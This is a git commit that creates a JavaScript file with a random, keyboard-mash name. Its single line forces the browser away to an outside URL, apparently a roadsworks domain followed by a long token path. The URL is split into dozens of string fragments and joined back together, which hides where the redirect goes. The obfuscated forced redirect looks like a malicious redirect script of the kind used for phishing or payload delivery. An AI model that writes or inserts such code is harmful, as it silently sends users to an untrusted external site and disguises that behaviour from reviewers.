b8882dfba34610f1759d6a2dd06082361a1a2464
Excessors <113865732+Excessors@users.noreply.github.com>
2022-12-31 18:15:11 +0100

    Create dryhfjrdyhftyjdrhgthyjdthgrtsr.js

---
+++ dryhfjrdyhftyjdrhgthyjdthgrtsr.js
@@ -0,0 +1,1 @@
+window.location.replace(``.concat(`ht`,`tps:/`,`/www`,`.road`,`swor`,`ks.co`,`m/gQ`,`_hBEI`,`KQRf`,`ugBl`,`4Sr-`,`C7ER`,`6nvQ`,`Y2KM`,`vJIA`,`lkTEa`,`hN4H`,`WthA`,`nNI`,`PGmu`,`HEo9`,`_Prg`,`NZKd`,`XDwyH`,`O8Tb_`,`NTk`,`iN1G`,`oQ~`,`~/TA`,`HA/YYYYFz3miS5o8T`))
